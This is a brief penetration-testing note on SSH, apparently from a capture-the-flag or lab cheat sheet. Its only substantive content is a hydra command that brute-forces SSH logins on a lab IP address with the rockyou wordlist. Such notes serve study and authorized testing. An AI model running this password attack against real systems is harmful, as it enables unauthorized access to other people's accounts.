---
description: Nice replacement for telnet
---

# SSH (Secure Socket Shell)

### Exploitation&#x20;

#### Password cracking with hydra

```bash
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.26.151 ssh
```
